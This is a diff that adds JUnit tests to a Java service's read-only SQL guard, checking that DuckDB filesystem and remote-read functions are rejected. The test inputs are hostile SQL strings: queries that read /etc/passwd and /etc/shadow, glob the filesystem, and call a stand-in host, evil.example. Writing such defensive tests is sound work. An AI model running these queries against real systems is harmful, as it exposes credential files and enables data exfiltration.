@@ -54,4 +54,42 @@ class TabularSqlServiceTest {
         assertThrows(IllegalArgumentException.class,
                 () -> TabularSqlService.requireReadOnly("INSERT INTO t VALUES (1)"));
     }
+
+    // --- 보안: DuckDB 파일시스템 함수 차단 (SELECT 안에서도 임의 파일을 읽으므로) ---
+
+    @Test
+    void rejectsReadCsvAuto() {
+        assertThrows(IllegalArgumentException.class,
+                () -> TabularSqlService.requireReadOnly("SELECT * FROM read_csv_auto('/etc/passwd')"));
+    }
+
+    @Test
+    void rejectsReadText() {
+        assertThrows(IllegalArgumentException.class,
+                () -> TabularSqlService.requireReadOnly("SELECT read_text('/etc/shadow')"));
+    }
+
+    @Test
+    void rejectsReadParquet() {
+        assertThrows(IllegalArgumentException.class,
+                () -> TabularSqlService.requireReadOnly("SELECT * FROM read_parquet('/data/secret.parquet')"));
+    }
+
+    @Test
+    void rejectsGlob() {
+        assertThrows(IllegalArgumentException.class,
+                () -> TabularSqlService.requireReadOnly("SELECT * FROM glob('/**')"));
+    }
+
+    @Test
+    void rejectsHttpfsExfil() {
+        assertThrows(IllegalArgumentException.class,
+                () -> TabularSqlService.requireReadOnly("SELECT * FROM read_csv_auto('https://evil.example/x.csv')"));
+    }
+
+    @Test
+    void stillAllowsNormalTableSelect() {
+        assertDoesNotThrow(() ->
+                TabularSqlService.requireReadOnly("SELECT region, SUM(revenue_musd) FROM revenue GROUP BY region"));
+    }
 }
